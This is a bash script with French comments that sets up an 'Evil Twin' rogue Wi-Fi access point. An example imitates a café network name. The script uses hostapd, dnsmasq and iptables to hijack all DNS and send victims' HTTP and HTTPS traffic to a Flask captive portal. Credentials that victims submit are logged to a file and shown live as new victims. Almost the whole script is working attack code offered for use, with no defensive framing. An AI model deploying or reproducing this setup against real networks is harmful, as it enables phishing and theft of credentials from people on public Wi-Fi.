#!/bin/bash
# ─────────────────────────────────────────────────────────────────────────────
#  Evil Twin — Rogue AP Setup Script
#  Lance: hostapd (AP) + dnsmasq (DHCP+DNS) + iptables + captive portal Flask
#
#  Requis:
#    sudo apt install hostapd dnsmasq
#    pip install flask
#    1 clé WiFi USB compatible AP mode (ex: Alfa AWUS036ACH)
#
#  Usage: sudo bash rogue_ap_setup.sh [SSID] [INTERFACE_AP] [INTERFACE_WAN]
#    SSID          : nom du réseau à créer (défaut: WiFi_Public)
#    INTERFACE_AP  : interface WiFi USB pour l'AP (défaut: wlan1)
#    INTERFACE_WAN : interface internet sortante (défaut: wlan0)
#
#  Exemple: sudo bash rogue_ap_setup.sh "Starbucks_WiFi" wlan1 wlan0
#  CTRL+C pour arrêter proprement tout.
# ─────────────────────────────────────────────────────────────────────────────

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── Paramètres ─────────────────────────────────────────────────────────────
SSID="${1:-WiFi_Public}"
AP_IF="${2:-wlan1}"       # interface AP (clé USB WiFi)
WAN_IF="${3:-wlan0}"      # interface internet
AP_IP="192.168.66.1"      # IP de l'attaquant sur l'AP
DHCP_RANGE_START="192.168.66.10"
DHCP_RANGE_END="192.168.66.100"
PORTAL_PORT="5000"
PORTAL_PY="$SCRIPT_DIR/captive_portal.py"

# ── Couleurs ───────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
BLU='\033[0;34m'; CYN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${BLU}[*]${NC} $1"; }
ok()   { echo -e "${GRN}[✓]${NC} $1"; }
warn() { echo -e "${YEL}[!]${NC} $1"; }
err()  { echo -e "${RED}[✗]${NC} $1"; exit 1; }

# ── Vérifications ──────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && err "Lance avec sudo"
command -v hostapd &>/dev/null  || err "hostapd manquant: sudo apt install hostapd"
command -v dnsmasq &>/dev/null  || err "dnsmasq manquant: sudo apt install dnsmasq"
command -v python3 &>/dev/null  || err "python3 manquant"
[[ -f "$PORTAL_PY" ]] || err "captive_portal.py introuvable: $PORTAL_PY"

# vérifie que l'interface AP existe
ip link show "$AP_IF" &>/dev/null || {
    warn "Interface '$AP_IF' introuvable. Interfaces disponibles:"
    ip link show | grep -E '^[0-9]+: (wlan|wlp|en)' | awk '{print "   " $2}' | tr -d ':'
    err "Spécifie la bonne interface: sudo bash $0 '$SSID' <iface_ap> $WAN_IF"
}

# vérifie le support AP mode
if ! iw phy "$(iw dev "$AP_IF" info | awk '/wiphy/{print "phy"$2}')" info \
   | grep -q "AP$" 2>/dev/null; then
    warn "Vérification AP mode non conclusive pour $AP_IF — on continue quand même"
fi

# ── Fichiers de config temporaires ─────────────────────────────────────────
HOSTAPD_CONF="/tmp/evil_twin_hostapd.conf"
DNSMASQ_CONF="/tmp/evil_twin_dnsmasq.conf"
PIDS_FILE="/tmp/evil_twin_pids.txt"

echo "" > "$PIDS_FILE"

banner() {
    echo -e "${CYN}"
    echo "╔══════════════════════════════════════════════════════╗"
    echo "║          EVIL TWIN — ROGUE AP SETUP                 ║"
    echo "╠══════════════════════════════════════════════════════╣"
    printf "║  SSID     : %-38s║\n" "$SSID"
    printf "║  AP iface : %-38s║\n" "$AP_IF"
    printf "║  WAN iface: %-38s║\n" "$WAN_IF"
    printf "║  AP IP    : %-38s║\n" "$AP_IP"
    printf "║  Portal   : http://%s:%-25s║\n" "$AP_IP" "$PORTAL_PORT"
    echo "╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}
banner

# ── 1. Stop services conflictuels ──────────────────────────────────────────
log "Stop NetworkManager / wpa_supplicant sur $AP_IF..."
systemctl stop NetworkManager 2>/dev/null || true
nmcli dev set "$AP_IF" managed no 2>/dev/null || true
pkill -f "wpa_supplicant.*$AP_IF" 2>/dev/null || true
sleep 1
ok "Services arrêtés"

# ── 2. Configurer l'interface AP ───────────────────────────────────────────
log "Configuration $AP_IF → $AP_IP/24..."
ip addr flush dev "$AP_IF" 2>/dev/null || true
ip link set "$AP_IF" up
ip addr add "$AP_IP/24" dev "$AP_IF"
ok "$AP_IF configuré: $AP_IP/24"

# ── 3. Générer hostapd.conf ────────────────────────────────────────────────
cat > "$HOSTAPD_CONF" << HOSTAPDEOF
interface=$AP_IF
ssid=$SSID
driver=nl80211
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# Réseau ouvert — pas de mot de passe (Evil Twin cible les réseaux WiFi publics)
# Pour cloner un réseau WPA2: ajoute wpa=2, wpa_passphrase=<mdp>, wpa_key_mgmt=WPA-PSK
HOSTAPDEOF
ok "hostapd.conf généré: $HOSTAPD_CONF"

# ── 4. Générer dnsmasq.conf ────────────────────────────────────────────────
# Redirige TOUT le DNS vers notre machine → portail captif
cat > "$DNSMASQ_CONF" << DNSMASQEOF
interface=$AP_IF
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
# redirige tous les noms DNS vers l'attaquant (captive portal)
address=/#/$AP_IP
# TTL court pour forcer le re-lookup
dhcp-option=option:dns-server,$AP_IP
log-queries
no-resolv
DNSMASQEOF
ok "dnsmasq.conf généré: $DNSMASQ_CONF"

# ── 5. iptables — NAT + redirect captive portal ─────────────────────────────
log "Configuration iptables..."
# flush les règles existantes
iptables -F
iptables -t nat -F
iptables -t mangle -F

# forwarding internet → victimes (optionnel: donne accès internet)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o "$WAN_IF" -j MASQUERADE
iptables -A FORWARD -i "$AP_IF" -o "$WAN_IF" -j ACCEPT
iptables -A FORWARD -i "$WAN_IF" -o "$AP_IF" -m state --state ESTABLISHED,RELATED -j ACCEPT

# ── CAPTIVE PORTAL REDIRECT ────────────────────────────────────────────────
# Tout le HTTP (port 80) → portail Flask
iptables -t nat -A PREROUTING -i "$AP_IF" -p tcp --dport 80 -j REDIRECT --to-port "$PORTAL_PORT"
# Tout le HTTPS (port 443) → portail Flask (pas de vrai SSL, mais déclenche le portail)
iptables -t nat -A PREROUTING -i "$AP_IF" -p tcp --dport 443 -j REDIRECT --to-port "$PORTAL_PORT"
# DNS: laisse dnsmasq répondre (redirige tout DNS vers AP_IP)
# iptables accepte déjà le DNS sur l'interface AP

ok "iptables configuré (HTTP/HTTPS → portail, NAT activé)"

# ── 6. Lancer dnsmasq ─────────────────────────────────────────────────────
log "Lancement dnsmasq..."
pkill dnsmasq 2>/dev/null || true
sleep 0.5
dnsmasq --conf-file="$DNSMASQ_CONF" --pid-file=/tmp/evil_twin_dnsmasq.pid &
echo "dnsmasq:$!" >> "$PIDS_FILE"
sleep 1
ok "dnsmasq lancé (PID: $(cat /tmp/evil_twin_dnsmasq.pid 2>/dev/null || echo '?'))"

# ── 7. Lancer hostapd ─────────────────────────────────────────────────────
log "Lancement hostapd (AP '$SSID' sur $AP_IF)..."
hostapd "$HOSTAPD_CONF" &
HOSTAPD_PID=$!
echo "hostapd:$HOSTAPD_PID" >> "$PIDS_FILE"
sleep 2

# vérifie que hostapd est bien lancé
if ! kill -0 $HOSTAPD_PID 2>/dev/null; then
    err "hostapd a planté — vérifie que $AP_IF supporte le mode AP (iw phy0 info | grep -A5 'Supported interface')"
fi
ok "hostapd lancé (PID: $HOSTAPD_PID) — AP '$SSID' visible ✓"

# ── 8. Lancer le captive portal ────────────────────────────────────────────
log "Lancement captive portal Flask (port $PORTAL_PORT)..."
SSID="$SSID" python3 "$PORTAL_PY" &
FLASK_PID=$!
echo "flask:$FLASK_PID" >> "$PIDS_FILE"
sleep 2

if ! kill -0 $FLASK_PID 2>/dev/null; then
    err "Flask a planté — pip install flask ?"
fi
ok "Captive portal lancé (PID: $FLASK_PID)"

# ── Statut final ──────────────────────────────────────────────────────────
echo ""
echo -e "${GRN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GRN}║  ✅  EVIL TWIN OPÉRATIONNEL                              ║${NC}"
echo -e "${GRN}╠══════════════════════════════════════════════════════════╣${NC}"
printf "${GRN}║  📡 SSID      : %-43s║${NC}\n" "'$SSID'"
printf "${GRN}║  🌐 AP IP     : %-43s║${NC}\n" "$AP_IP"
printf "${GRN}║  🔓 Sécurité  : %-43s║${NC}\n" "Ouvert (pas de mot de passe)"
printf "${GRN}║  💀 Creds     : %-43s║${NC}\n" "$SCRIPT_DIR/captured_creds.txt"
echo -e "${GRN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YEL}  CTRL+C pour arrêter proprement tout${NC}"
echo ""

# ── Cleanup à CTRL+C ──────────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Arrêt en cours..."

    # kill les processus lancés
    kill $HOSTAPD_PID $FLASK_PID 2>/dev/null || true
    pkill dnsmasq 2>/dev/null || true

    # restore iptables
    iptables -F
    iptables -t nat -F
    iptables -t mangle -F
    echo 0 > /proc/sys/net/ipv4/ip_forward

    # restore NetworkManager
    systemctl start NetworkManager 2>/dev/null || true

    # affiche les creds capturés
    CREDS="$SCRIPT_DIR/captured_creds.txt"
    if [[ -f "$CREDS" ]] && [[ -s "$CREDS" ]]; then
        echo ""
        echo -e "${GRN}═══════════════ CREDENTIALS CAPTURÉS ═══════════════${NC}"
        cat "$CREDS"
        echo -e "${GRN}═════════════════════════════════════════════════════${NC}"
    else
        echo "Aucun credential capturé."
    fi

    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF" "$PIDS_FILE" /tmp/evil_twin_dnsmasq.pid
    ok "Cleanup terminé. Bonne journée brody ✌️"
    exit 0
}

trap cleanup INT TERM

# ── Live tail des logs ────────────────────────────────────────────────────
log "En attente de connexions..."
echo "  (les credentials apparaissent ici dès qu'une victime soumet le form)"
echo ""

# surveille le fichier de creds en live
CREDS="$SCRIPT_DIR/captured_creds.txt"
touch "$CREDS"
tail -f "$CREDS" | while read line; do
    echo -e "${GRN}  💀 NOUVELLE VICTIME: $line${NC}"
done &

# wait sur hostapd (process principal)
wait $HOSTAPD_PID
cleanup
